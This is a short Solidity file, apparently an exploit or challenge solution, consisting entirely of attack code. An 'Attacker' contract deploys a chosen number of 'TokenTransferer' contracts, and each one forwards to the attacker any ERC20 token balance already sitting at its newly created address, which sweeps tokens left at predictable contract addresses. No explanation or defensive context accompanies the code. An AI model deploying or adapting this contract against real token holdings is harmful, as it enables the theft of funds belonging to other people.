// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {
    constructor(address attaker, IERC20 token, uint256 repeat) {
        for (uint256 i; i != repeat; ++i) {
            new TokenTransferer(attaker, token);
        }
    }
}

contract TokenTransferer {
    constructor(address attacker, IERC20 token) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}
